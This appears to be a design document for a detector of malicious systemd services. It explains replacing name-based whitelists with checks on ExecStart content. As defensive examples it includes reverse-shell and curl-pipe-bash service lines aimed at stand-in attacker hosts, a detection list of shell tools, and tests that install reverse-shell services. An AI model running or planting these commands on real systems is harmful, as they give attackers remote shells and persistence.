# Content-Based Validation Strategy (v1.3.0)

## The Problem with Name-Based Whitelisting

### v1.2 Approach (Vulnerable)

**Old Method**: Whitelist by service name
```bash
KNOWN_GOOD_SERVICES=(
    "^systemd-"
    "^dbus-"
    "^snap\."
)
```

**Attack Vector**: Attacker creates malicious service with legitimate-sounding name
```systemd
# /etc/systemd/system/systemd-timesync.service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444'

# Result in v1.2: SKIPPED (name matches "^systemd-")
# Malware goes undetected!
```

### Real-World Attack Examples

**Example 1: Mimicking systemd Service**
```systemd
# Service: systemd-update-checker.service
ExecStart=/tmp/malware.sh

# v1.2: Whitelisted (name starts with "systemd-")
# v1.3: HIGH confidence (executes from /tmp)
```

**Example 2: Mimicking DBus Service**
```systemd
# Service: dbus-monitor.service
ExecStart=/usr/bin/curl http://evil.com/payload.sh | bash

# v1.2: Whitelisted (name starts with "dbus-")
# v1.3: HIGH confidence (curl | bash pattern)
```

**Example 3: Mimicking Snap Service**
```systemd
# Service: snap.update.service
ExecStart=/bin/sh -c 'nc -e /bin/sh attacker.com 1337'

# v1.2: Whitelisted (name matches "^snap\.")
# v1.3: HIGH confidence (nc -e pattern)
```

---

## The Solution: Content-Based Validation

### v1.3 Approach (Secure)

**New Method**: Validate what is being executed, not what it's named

#### Three-Tier Validation Process

```
1. DANGEROUS PATTERN CHECK (overrides everything)
   ├─ Contains /dev/tcp/ → HIGH confidence (never whitelist)
   ├─ Contains bash -i → HIGH confidence (never whitelist)
   ├─ Contains nc -e → HIGH confidence (never whitelist)
   └─ Contains curl | bash → HIGH confidence (never whitelist)

2. SAFE EXECUTABLE PATH CHECK
   ├─ Starts with /usr/bin/ → Consider safe
   ├─ Starts with /usr/sbin/ → Consider safe
   ├─ Starts with /bin/ → Consider safe
   └─ Starts with /lib/systemd/ → Consider safe

3. SAFE COMMAND PATTERN CHECK
   ├─ Matches /bin/true → Consider safe
   ├─ Matches @reboot → Consider safe (systemd prefix)
   └─ Matches /usr/bin/test → Consider safe
```

---

## Implementation Details

### Known-Good Executable Paths

These paths are trusted because:
1. They're system-managed directories
2. Files in these paths are usually package-managed
3. Attackers rarely have write access to these locations

```bash
KNOWN_GOOD_EXECUTABLE_PATHS=(
    "^/usr/bin/"      # Standard user binaries
    "^/usr/sbin/"     # System binaries
    "^/bin/"          # Essential binaries
    "^/sbin/"         # System binaries
    "^/usr/lib/"      # Library executables
    "^/lib/"          # Library executables
    "^/lib/systemd/"  # Systemd internal binaries
    "^/usr/lib/systemd/" # Systemd internal binaries
)
```

### Never Whitelist Patterns

These patterns are ALWAYS malicious, regardless of executable path:

```bash
NEVER_WHITELIST_PATTERNS=(
    "/dev/tcp/"          # Bash reverse shell
    "/dev/udp/"          # Bash reverse shell (UDP)
    "bash -i"            # Interactive bash (common in shells)
    "sh -i"              # Interactive sh
    "nc -e"              # Netcat execute
    "| nc"               # Pipe to netcat
    "| bash"             # Pipe to bash
    "| sh"               # Pipe to sh
    ">& /dev/"           # Redirect to device (shells)
    "exec.*socket"       # Socket execution
    "python.*socket"     # Python socket
    "perl.*socket"       # Perl socket
    "ruby.*socket"       # Ruby socket
    "socat"              # Socket cat
    "telnet.*bash"       # Telnet to bash
    "xterm -display"     # X11 forwarding
    "mknod.*backpipe"    # Named pipe backdoor
)
```

### Known-Good Command Patterns

These patterns indicate safe, standard system operations:

```bash
KNOWN_GOOD_COMMAND_PATTERNS=(
    "^/usr/bin/test "    # Test command
    "^/usr/bin/\\["      # Test command (bracket form)
    "^/bin/true$"        # No-op (always succeeds)
    "^/bin/false$"       # No-op (always fails)
    "^@"                 # systemd special prefix
    "^-"                 # systemd prefix (ignore failures)
    "^:"                 # systemd prefix (always succeed)
    "^\\+"               # systemd prefix (elevated privileges)
    "^!"                 # systemd prefix (inverse exit code)
)
```

---

## Decision Flow

### is_command_safe() Function Logic

```
Input: ExecStart command string

Step 1: Check NEVER_WHITELIST_PATTERNS
   ├─ Match found? → return 1 (DANGEROUS)
   └─ No match? → Continue to Step 2

Step 2: Check KNOWN_GOOD_EXECUTABLE_PATHS
   ├─ Match found? → return 0 (SAFE)
   └─ No match? → Continue to Step 3

Step 3: Check KNOWN_GOOD_COMMAND_PATTERNS
   ├─ Match found? → return 0 (SAFE)
   └─ No match? → return 1 (UNKNOWN/SUSPICIOUS)
```

---

## Real-World Examples

### Example 1: Legitimate systemd Service

**Service**: `/lib/systemd/system/ssh.service`
```systemd
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
```

**v1.3 Analysis**:
1. Check NEVER_WHITELIST: No dangerous patterns ✓
2. Check GOOD_PATHS: Starts with `/usr/sbin/` ✓
3. Result: `is_command_safe()` returns 0 (SAFE)
4. Confidence: LOW (if package-managed, downgraded to LOW)
5. Output: Hidden by default (suspicious_only mode)

---

### Example 2: Malicious Service with Legitimate Name

**Service**: `/etc/systemd/system/systemd-timesyncd.service` (mimicking real service)
```systemd
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444'
```

**v1.3 Analysis**:
1. Check NEVER_WHITELIST: Contains `bash -i` and `/dev/tcp/` ✗
2. Result: `is_command_safe()` returns 1 (DANGEROUS)
3. Pattern match triggers: HIGH confidence
4. Log: "[FINDING] Dangerous command in systemd service"
5. Output: **SHOWN** (HIGH confidence malicious)

**Comparison**:
- v1.2: Would be skipped (name matches `^systemd-`)
- v1.3: **DETECTED** (dangerous command pattern)

---

### Example 3: Suspicious but Legitimate Service

**Service**: `/etc/systemd/system/docker.service`
```systemd
ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
```

**v1.3 Analysis**:
1. Check NEVER_WHITELIST: No dangerous patterns ✓
2. Check GOOD_PATHS: Starts with `/usr/bin/` ✓
3. Result: `is_command_safe()` returns 0 (SAFE)
4. Check package: `dpkg:docker-ce` → downgrade
5. Confidence: LOW
6. Output: Hidden by default

---

### Example 4: Custom Script Execution

**Service**: `/etc/systemd/system/my-app.service`
```systemd
ExecStart=/opt/myapp/bin/server --config /etc/myapp/config.yml
```

**v1.3 Analysis**:
1. Check NEVER_WHITELIST: No dangerous patterns ✓
2. Check GOOD_PATHS: Starts with `/opt/` (not in whitelist) ✗
3. Check GOOD_PATTERNS: No match ✗
4. Result: `is_command_safe()` returns 1 (UNKNOWN)
5. Confidence: MEDIUM (unknown command)
6. Check package: If unmanaged → stay MEDIUM
7. Output: **SHOWN** (MEDIUM confidence, requires review)

**Analyst Action**: Review if `/opt/myapp/` is expected application

---

### Example 5: Download-Execute Attack

**Service**: `/etc/systemd/system/update-checker.service`
```systemd
ExecStart=/usr/bin/curl https://evil.com/payload.sh | /bin/bash
```

**v1.3 Analysis**:
1. Check NEVER_WHITELIST: Contains `| bash` ✗
2. Result: `is_command_safe()` returns 1 (DANGEROUS)
3. Pattern match triggers: HIGH confidence
4. Log: "[FINDING] Dangerous command in systemd service"
5. Output: **SHOWN** (HIGH confidence malicious)

**Note**: Even though it starts with `/usr/bin/curl` (trusted path), the `| bash` pattern overrides the whitelist.

---

## Advantages Over Name-Based Whitelisting

| Aspect | v1.2 (Name-Based) | v1.3 (Content-Based) |
|--------|-------------------|----------------------|
| **Detection of Mimicked Services** | ❌ Bypassed | ✅ Detected |
| **Safe Binary Validation** | ❌ None | ✅ Path-based |
| **Dangerous Pattern Override** | ❌ Not enforced | ✅ Always checked |
| **Custom Application Support** | ⚠️ All flagged | ✅ Intelligent scoring |
| **False Positive Rate** | 🟡 Medium | 🟢 Lower |
| **False Negative Rate** | 🔴 Higher | 🟢 Lower |
| **Attack Resistance** | 🔴 Vulnerable to mimicry | 🟢 Resistant |

---

## Security Benefits

### 1. Prevents Service Name Mimicry
Attackers can no longer hide malicious commands behind legitimate-sounding names.

### 2. Enforces Command Validation
Every ExecStart command is analyzed for actual content, not just trusted by name.

### 3. Dangerous Pattern Override
Even if a command is from a trusted path, dangerous patterns (reverse shells, download-execute) are always flagged.

### 4. Reduces False Negatives
Malicious services with creative names are now detected.

### 5. Maintains Low False Positives
Legitimate system binaries from trusted paths still get LOW confidence.

---

## Migration from v1.2

### What Changed

**Removed**:
```bash
KNOWN_GOOD_SERVICES=(
    "^systemd-"
    "^dbus-"
    # ... 30+ patterns
)

is_known_good_service() {
    # Check service name
}
```

**Added**:
```bash
KNOWN_GOOD_EXECUTABLE_PATHS=(
    "^/usr/bin/"
    # ... trusted paths
)

NEVER_WHITELIST_PATTERNS=(
    "/dev/tcp/"
    # ... dangerous patterns
)

is_command_safe() {
    # Check command content
}
```

### Behavioral Differences

**v1.2**: Service named `systemd-update.service` → Skipped (whitelisted)
**v1.3**: Service named `systemd-update.service` → Analyzed by command content

**Example Impact**:
- Legitimate `systemd-timesyncd.service` with `/usr/lib/systemd/systemd-timesyncd`: Still LOW confidence ✓
- Malicious `systemd-timesyncd.service` with `bash -i >& /dev/tcp/`: Now HIGH confidence ✓

---

## Testing Recommendations

### Test Case 1: Legitimate Service
```bash
# Create test service
cat > /etc/systemd/system/test-legit.service << EOF
[Service]
ExecStart=/usr/bin/echo "Hello World"
EOF

# Expected: LOW confidence (safe path, no dangerous patterns)
```

### Test Case 2: Malicious Service with Legitimate Name
```bash
# Create test service
cat > /etc/systemd/system/systemd-test.service << EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444'
EOF

# Expected: HIGH confidence (dangerous pattern detected)
# v1.2 would have skipped this!
```

### Test Case 3: Custom Application
```bash
# Create test service
cat > /etc/systemd/system/myapp.service << EOF
[Service]
ExecStart=/opt/myapp/server
EOF

# Expected: MEDIUM confidence (unknown path, not dangerous)
```

---

## Summary

**v1.3.0 Content-Based Validation** provides:

✅ **Security**: Can't be bypassed by service name mimicry
✅ **Accuracy**: Analyzes actual commands, not just names
✅ **Intelligence**: Three-tier validation (dangerous → safe path → safe pattern)
✅ **Flexibility**: Supports custom applications while detecting threats
✅ **Defense in Depth**: Dangerous patterns always override path-based whitelisting

**Result**: More secure, more accurate, fewer false negatives.
